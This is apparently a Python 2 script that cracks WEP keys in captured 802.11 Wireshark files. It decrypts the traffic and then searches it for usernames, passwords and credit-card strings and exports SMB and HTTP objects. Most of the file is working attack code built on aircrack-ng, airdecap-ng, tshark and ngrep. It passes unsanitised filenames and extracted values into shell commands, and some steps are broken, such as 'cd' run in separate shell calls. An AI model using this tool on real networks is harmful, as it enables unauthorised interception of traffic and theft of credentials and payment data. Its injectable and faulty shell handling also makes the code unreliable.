#!/usr/bin/python

# -------------------------------------------------------------------------------------
#      PYTHON UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Load any required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Show a universal header.    
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print "\nPCAP-CRACKER - SSID AND WEP KEY CRACKER FOR IEEE (802.11) RADIO .PCAP FILES"
print "\n          BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)\n"

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Conduct routine and simple tests on supplied arguements.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
    print "\nPlease run this python script as root..."
    exit(True)

if len(sys.argv) < 2:
    print "\nUse the command python pcap-cracker.py wiresharkfile.pcapng\n"
    exit(True)

filename = sys.argv[1]

if os.path.exists(filename) == 0:
    print "\nFile " + filename + " was not found, did you spell it correctly?"
    exit(True)

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Check all required dependencies are installed on the system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

installed = False

if os.path.isfile('/usr/bin/pcapfix') != 1:
    print "Installing pcapfix...\n"
    os.system("apt-get install pcapfix")
    installed = True

if os.path.isfile("/usr/sbin/airmon-ng") != 1:
    print "Installing aircrack-ng...\n"
    os.system("apt-get install build-essential")
    os.system("apt-get install libssl-dev")
    os.system("apt-get install subversion")
    os.system("apt-get install checkinstall")
    os.system("git clone https://github.com/aircrack-ng/aircrack-ng.git")
    os.system("cd aircrack-ng")
    os.system("make experimental=true")
    os.system("make install")
    os.system("cd..")
    os.system("airodump-ng-oui-update")
    installed = True

if os.path.isfile('/usr/bin/tshark') != 1:
    print "Installing tshark...\n"
    os.system("apt-get install tshark")
    installed = True

if os.path.isfile('/usr/bin/editcap') !=1:
    print "Installing wireshark...\n"
    os.system("apt-get install wireshark")
    installed = True

if installed == False:
    print "\nAll required dependencies are pre-installed...\n"
else:
    print "\nMissing dependencies have been installed for you...\n"

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Check type of wireshark file and adjust as required (pcapng -->  pcap).
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

typetest = filename[-6:]
newfiletype = filename[:-2]

if typetest == "pcapng":
	print "Converting file from pcapng to pcap...\n"
	os.system("editcap -F pcap " + filename + " " + newfiletype + "> /dev/null")
	filename = filename[:-2]

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Sometimes captured .PCAP files cut off or are corrupted in other ways.    
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("pcapfix -d " + filename + " -o Fixerror.pcap > /dev/null")

if os.path.isfile('./Fixerror.pcap') !=0:
    os.rename(filename, "Oldpcapfile.pcap")
    os.rename("Fixerror.pcap", filename)
    print "\nErrors found in your file have been fixed..."
    print "\nYour orginal file " + filename + " has been renamed Oldpcapfile.pcap."

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Extract the SSID from the .PCAP file.    
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("tcpdump -ennr " + filename + " '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt")
print ""

with open('SSID.txt', 'r') as myfile:
  ssid = myfile.read().replace('\n', '')
os.remove('./SSID.txt')
ssid = "00:" + ssid
temp=open("SSID.txt","w")
file.write (temp, ssid)
file.close(temp)

if ssid == "00:":
    os.remove("./SSID.txt")
    exit (True)

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Extract the WEP key fom the .PCAP file using the SSID
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("aircrack-ng -b " + ssid + " " + filename + " > Key.txt")
os.system("grep -o '![^\"]*' Key.txt > Key2.txt")
os.system("cat Key2.txt | sed 's/[^a-z  A-Z 0-1 :]//g' > Key3.txt")
os.system("cat Key3.txt | tr -d ' \t\n\r' > WepKey.txt")
os.remove('./Key.txt')
os.remove('./Key2.txt')
os.remove('./Key3.txt')

with open('WepKey.txt', 'r') as myfile:
  wep = myfile.read().replace('\n', '')

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Use the WEP key to creat a cracked version of the .PCAP file.  
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("airdecap-ng -w " + wep + " "+ filename +" " + "> /dev/null")
filename2 = filename[:-5]
filename2 = filename2 + "-dec.pcap"
os.rename(filename2, "Cracked.pcap")

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Now conduct some reconissance on the cracked file.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("tshark -nr Cracked.pcap --export-objects smb,Smbfolder > /dev/null 2>/dev/null")
os.system("tshark -nr Cracked.pcap --export-objects http,Httpfolder > /dev/null 2>/dev/null")
os.system("ngrep -q -I Cracked.pcap | grep -i username > Username.txt")
os.system("ngrep -q -I Cracked.pcap | grep -i password > Password.txt")
os.system("ngrep -q -I Cracked.pcap | grep -i Credit > Creditcard.txt")
os.system("ls -p -I pcap-cracker.py -I " + filename + " -I Httpfolder -I Smbfolder")
exit(False)

#EOF
